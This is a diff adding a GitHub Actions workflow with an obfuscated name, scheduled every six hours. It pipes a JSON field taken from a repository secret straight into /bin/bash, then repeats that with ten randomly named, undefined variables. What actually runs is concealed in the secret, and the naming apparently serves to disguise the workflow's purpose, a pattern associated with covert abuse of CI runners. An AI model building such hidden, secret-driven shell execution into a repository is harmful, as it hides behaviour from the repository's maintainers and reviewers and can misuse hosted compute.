@@ -1,0 +1,29 @@
+name: xianghuaguo3451
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianghuaguo3451
+        env:
+          b43: ${{ secrets.b43 }}
+        run: |
+          echo $b43 | jq -r .spdf893 | /bin/bash
+          echo $h526 | jq -r .gaul5 | /bin/bash
+          echo $xirfb27 | jq -r .cjyim9 | /bin/bash
+          echo $bt120 | jq -r .xf907 | /bin/bash
+          echo $hxbik261 | jq -r .my979 | /bin/bash
+          echo $cwem512 | jq -r .gcb4 | /bin/bash
+          echo $abiuu96 | jq -r .nevm4724 | /bin/bash
+          echo $nksbb2681 | jq -r .lpl69 | /bin/bash
+          echo $ih40 | jq -r .qxgd6895 | /bin/bash
+          echo $fy9 | jq -r .zneww180 | /bin/bash
+          echo $ciw7359 | jq -r .ntbt28838 | /bin/bash
+
